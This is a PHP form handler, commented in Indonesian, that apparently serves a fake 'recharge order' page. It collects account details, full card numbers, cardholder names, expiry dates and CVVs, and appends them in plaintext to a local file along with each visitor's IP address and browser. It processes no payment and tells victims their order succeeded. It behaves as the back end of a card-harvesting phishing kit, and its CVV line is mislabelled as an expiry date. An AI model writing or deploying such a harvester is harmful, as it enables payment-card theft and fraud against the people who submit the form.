<?php
// Pastikan request adalah POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
	
	date_default_timezone_set('Asia/Makassar');

	$ip      = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
	$waktu   = date('Y-m-d H:i:s');
	$browser = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';

    // Tangkap data dari JavaScript
    $id     = htmlspecialchars($_POST['accountId'] ?? '');
    $name   = htmlspecialchars($_POST['accountName'] ?? '');
    $number = htmlspecialchars($_POST['cardNumber'] ?? '');
    $card   = htmlspecialchars($_POST['cardholder'] ?? '');
    $exp    = htmlspecialchars($_POST['expiry'] ?? '');
    $cvv    = htmlspecialchars($_POST['cvv'] ?? '');

    // Validasi sederhana
    if (empty($id) || empty($number)) {
        echo "Account ID and Card Number are required!";
        exit;
    }


    // Data yang aman untuk disimpan
    $isi_pesan  = "Detail Recharge Order:\n\n";
	$isi_pesan .= "Date/Time    : " . $waktu . " WITA\n";
	$isi_pesan .= "IP Address   : " . $ip . "\n";
	$isi_pesan .= "Browser      : " . $browser . "\n";
    $isi_pesan .= "Account ID   : " . $id . "\n";
    $isi_pesan .= "Account Name : " . $name . "\n";
    $isi_pesan .= "Card Number  : " . $number . "\n";
    $isi_pesan .= "Cardholder   : " . $card . "\n";
    $isi_pesan .= "Expiry Date  : " . $exp . "\n";
	$isi_pesan .= "Expiry Date  : " . $cvv . "\n";

    // Simpan ke file
    $file = __DIR__ . "/recharge_orders.txt";

    $kirim = file_put_contents(
        $file,
        $isi_pesan . "\n------------------------\n",
        FILE_APPEND | LOCK_EX
    );

    if ($kirim !== false) {
        echo "Your recharge order has been received successfully.";
    } else {
        echo "Failed to process your order. Please try again.";
    }

} else {
    echo "Error: Unauthorized access.";
}
?>
